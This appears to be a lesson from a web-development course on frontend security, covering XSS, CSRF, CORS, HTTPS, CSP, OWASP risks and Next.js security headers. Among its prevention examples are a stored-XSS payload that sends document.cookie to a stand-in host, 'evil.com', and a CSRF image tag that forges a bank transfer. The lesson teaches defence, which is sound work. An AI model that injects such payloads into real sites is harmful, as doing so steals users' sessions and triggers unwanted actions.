# 002 - Web Security Basics

## Section
Phase 9 — Auth and Security

## Learning Objectives

- Understand XSS and how to prevent it
- Understand CSRF and how cookies protect against it
- Configure CORS correctly
- Know what CSP does
- Recognize the most important OWASP Top 10 risks

---

## 1. XSS — Cross-Site Scripting

XSS happens when an attacker injects malicious JavaScript into your page, which then runs in other users' browsers.

### Stored XSS

Attacker saves a script in your database (comment, profile bio). It runs for every user who views that content.

```html
<!-- Attacker submits this as a comment: -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

### Prevention

```tsx
// 1. Never use dangerouslySetInnerHTML with user input
// BAD:
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// GOOD: React automatically escapes user content
<div>{userComment}</div>   // < > " ' are escaped

// 2. If you MUST render HTML (rich text editor output), sanitize first
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(richText) }} />

// 3. Never build URLs from user input without encoding
// BAD:
window.location.href = '/search?q=' + userInput
// GOOD:
window.location.href = '/search?q=' + encodeURIComponent(userInput)

// 4. HttpOnly cookies — JS cannot read them
// Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
```

---

## 2. CSRF — Cross-Site Request Forgery

An attacker tricks a logged-in user into making an unintended request.

```html
<!-- Attacker's page loads this image -->
<img src="https://yourbank.com/transfer?to=hacker&amount=1000">
<!-- If the user is logged in to yourbank.com with a session cookie,
     this request carries their cookie and succeeds! -->
```

### Prevention

```
1. SameSite cookies — browser won't send cookie on cross-origin requests
   Set-Cookie: session=abc; SameSite=Strict; Secure

2. CSRF tokens — a secret random value in forms, verified by server

3. Custom request header — simple APIs require a header that simple forms can't send:
   X-Requested-With: XMLHttpRequest
   (Simple cross-origin requests can't set custom headers without CORS preflight)

4. For modern apps using JWTs in Authorization headers:
   CSRF is not an issue — browsers don't auto-send the Authorization header
```

---

## 3. CORS — Cross-Origin Resource Sharing

Browsers block cross-origin requests by default (the Same-Origin Policy). CORS lets a server say which origins are allowed to make requests to it.

```
Origin: protocol + domain + port
https://myapp.com   ≠   https://api.myapp.com  (different subdomain)
https://myapp.com   ≠   http://myapp.com       (different protocol)
https://myapp.com   ≠   https://myapp.com:3000 (different port)
```

### Server Response Headers

```
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400  (cache preflight for 24h)
```

### Next.js Route Handler

```typescript
// app/api/data/route.ts
import { NextRequest, NextResponse } from 'next/server'

const ALLOWED_ORIGINS = ['https://myapp.com', 'https://staging.myapp.com']

export async function GET(request: NextRequest) {
  const origin = request.headers.get('origin') ?? ''
  const isAllowed = ALLOWED_ORIGINS.includes(origin)

  const response = NextResponse.json({ data: 'hello' })

  if (isAllowed) {
    response.headers.set('Access-Control-Allow-Origin', origin)
    response.headers.set('Access-Control-Allow-Credentials', 'true')
  }

  return response
}

// Handle OPTIONS preflight
export async function OPTIONS(request: NextRequest) {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  })
}
```

---

## 4. HTTPS

HTTPS encrypts the connection between browser and server using TLS.

**Why it matters:**
- Prevents man-in-the-middle attacks (network eavesdropping)
- Required for `Secure` cookies
- Required for Service Workers and many browser APIs
- Affects search ranking (Google penalizes HTTP)

**In production**: Vercel, Netlify, Cloudflare all provide HTTPS automatically.

**Redirect HTTP → HTTPS**:
```typescript
// next.config.ts
const config: NextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
        ],
      },
    ]
  },
}
```

---

## 5. Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which sources of content are trusted. It's a strong XSS mitigation.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-RANDOM123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.googleapis.com;
  frame-ancestors 'none';
```

| Directive | Meaning |
|-----------|---------|
| `default-src` | Fallback for all content types |
| `script-src` | Where JS can be loaded from |
| `style-src` | Where CSS can be loaded from |
| `img-src` | Where images can be loaded from |
| `connect-src` | Where fetch/WebSocket can connect to |
| `frame-ancestors 'none'` | Prevents clickjacking via iframes |

```typescript
// next.config.ts — add CSP header
const config: NextConfig = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [{
        key: 'Content-Security-Policy',
        value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;"
      }]
    }]
  }
}
```

---

## 6. OWASP Top 10 Basics for Frontend

| # | Vulnerability | Frontend Mitigation |
|---|---------------|---------------------|
| A01 | Broken Access Control | Protect routes; validate roles on server |
| A02 | Cryptographic Failures | Use HTTPS; never store secrets in client code |
| A03 | Injection (XSS) | Escape output; sanitize HTML; use CSP |
| A04 | Insecure Design | Use HttpOnly cookies; validate on server |
| A05 | Security Misconfiguration | Set security headers; disable directory listing |
| A06 | Vulnerable Components | Keep dependencies updated; `pnpm audit` |
| A07 | Auth Failures | Short-lived tokens; logout invalidates session |
| A08 | Software Integrity Failures | Use lock files; verify npm package integrity |
| A09 | Logging Failures | Don't log sensitive data (passwords, tokens) |
| A10 | SSRF | Validate URLs on server; allowlist |

### `pnpm audit`

```bash
pnpm audit                    # check for vulnerable dependencies
pnpm audit --fix              # auto-upgrade fixable vulnerabilities
pnpm outdated                 # check for outdated packages
```

---

## 7. Security Headers Checklist

Add these to your Next.js `next.config.ts`:

```typescript
const securityHeaders = [
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
  { key: 'X-Frame-Options', value: 'DENY' },                // prevent clickjacking
  { key: 'X-Content-Type-Options', value: 'nosniff' },      // prevent MIME sniffing
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
]
```

Verify your headers at [securityheaders.com](https://securityheaders.com).

---

## Summary

| Attack | Prevention |
|--------|-----------|
| XSS | Escape output; sanitize HTML; HttpOnly cookies; CSP |
| CSRF | SameSite cookies; CSRF tokens; Authorization header |
| CORS | Server whitelist of trusted origins |
| Clickjacking | `X-Frame-Options: DENY`; `frame-ancestors 'none'` |
| Data exposure | HTTPS; no secrets in frontend code; HttpOnly cookies |
| Dependency vulns | `pnpm audit`; keep packages updated |

---

## Next Phase

Phase 10 — Testing: Vitest for unit tests, Playwright for E2E tests
